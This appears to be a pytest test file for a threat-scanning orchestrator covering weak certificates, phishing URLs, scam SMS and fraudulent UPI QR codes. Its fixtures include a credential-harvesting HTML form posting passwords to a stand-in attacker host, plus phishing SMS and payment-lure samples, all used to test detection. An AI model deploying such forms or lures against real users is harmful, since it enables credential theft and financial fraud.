"""
Unit & Integration Tests for Master Threat Orchestrator
Validates concurrent multi-phase inspection, risk score composition,
5-tier classification, and Web3 cryptographic commitment across all input types.
"""

import io
import pytest
import qrcode
from models.schemas import InputType, RiskTier, MasterScanResponse
from engine.orchestrator import orchestrate_full_scan, orchestrate_qr_scan
from scenarios.demo_cases import generate_emudhra_weak_certificate_pem


@pytest.mark.anyio
async def test_orchestrate_pem_certificate_weak_emudhra():
    """Validates orchestrator detecting Bug 2083449 eMudhra weak scalar on PEM cert input."""
    pem = generate_emudhra_weak_certificate_pem(scalar=4)
    res = await orchestrate_full_scan(target=pem, override_input_type=InputType.RAW_PEM_CERT)

    assert isinstance(res, MasterScanResponse)
    assert res.input_type == InputType.RAW_PEM_CERT
    assert res.risk_tier == RiskTier.CONFIRMED_MALICIOUS
    assert res.threat_score == 100
    assert res.is_safe is False
    assert res.crypto_report is not None
    assert res.crypto_report.emudhra_audit.vulnerable is True
    assert res.crypto_report.emudhra_audit.recovered_scalar_d == 4
    assert res.web3_commitment is not None
    assert res.web3_commitment.on_chain_registered is True


@pytest.mark.anyio
async def test_orchestrate_typosquat_and_dom_harvesting():
    """Validates orchestrator detecting combined typosquatting and cross-origin harvesting."""
    html_payload = """
    <html>
      <body>
        <form action="https://evil-hacker.com/exfiltrate" method="POST">
          <input type="text" name="user">
          <input type="password" name="pass">
        </form>
      </body>
    </html>
    """
    res = await orchestrate_full_scan(
        target="https://paypa1-security-check.com/login",
        html_content=html_payload,
    )

    assert isinstance(res, MasterScanResponse)
    assert res.risk_tier in (RiskTier.HIGH_RISK, RiskTier.CONFIRMED_MALICIOUS)
    assert res.threat_score >= 80
    assert res.is_safe is False
    assert res.threat_report is not None
    assert res.threat_report.domain_threats.is_typosquatted is True
    assert res.threat_report.dom_harvesting.harvesting_detected is True
    assert res.web3_commitment.on_chain_registered is True


@pytest.mark.anyio
async def test_orchestrate_coercive_sms_threat():
    """Validates orchestrator handling coercive SMS with IOC extraction and MITRE mapping."""
    msg = "URGENT: Your SBI account has been suspended! Visit http://sbi-unblock.xyz immediately to update PAN or pay via police@okhdfcbank."
    res = await orchestrate_full_scan(target=msg, override_input_type=InputType.TEXT_MESSAGE)

    assert isinstance(res, MasterScanResponse)
    assert res.input_type == InputType.TEXT_MESSAGE
    assert res.risk_tier in (RiskTier.SUSPICIOUS, RiskTier.HIGH_RISK, RiskTier.CONFIRMED_MALICIOUS)
    assert res.threat_score >= 30
    assert res.ai_briefing is not None
    assert len(res.ai_briefing.extracted_indicators) > 0
    assert res.correlation_report is not None
    assert res.correlation_report.has_campaign_match is True


@pytest.mark.anyio
async def test_orchestrate_benign_url():
    """Validates orchestrator cleanly classifying benign infrastructure without false positives."""
    res = await orchestrate_full_scan(target="https://python.org")

    assert isinstance(res, MasterScanResponse)
    assert res.risk_tier == RiskTier.LOW_RISK
    assert res.is_safe is True
    assert res.threat_score <= 25


@pytest.mark.anyio
async def test_orchestrate_qr_scan_workflow():
    """Validates orchestrator coordinating QR code image decoding and UPI audit."""
    img = qrcode.make("upi://pay?pa=traffic.police.challan@okhdfcbank&pn=TrafficDept&am=1000")
    buf = io.BytesIO()
    img.save(buf, format="PNG")

    res = await orchestrate_qr_scan(buf.getvalue())
    assert isinstance(res, MasterScanResponse)
    assert res.input_type == InputType.QR_CODE
    assert res.risk_tier == RiskTier.CONFIRMED_MALICIOUS
    assert res.threat_score >= 85
    assert res.qr_inspection is not None
    assert res.qr_inspection.payload_type == "upi_payment"
    assert res.qr_inspection.upi_details.is_suspicious_vpa is True
    assert res.web3_commitment.on_chain_registered is True
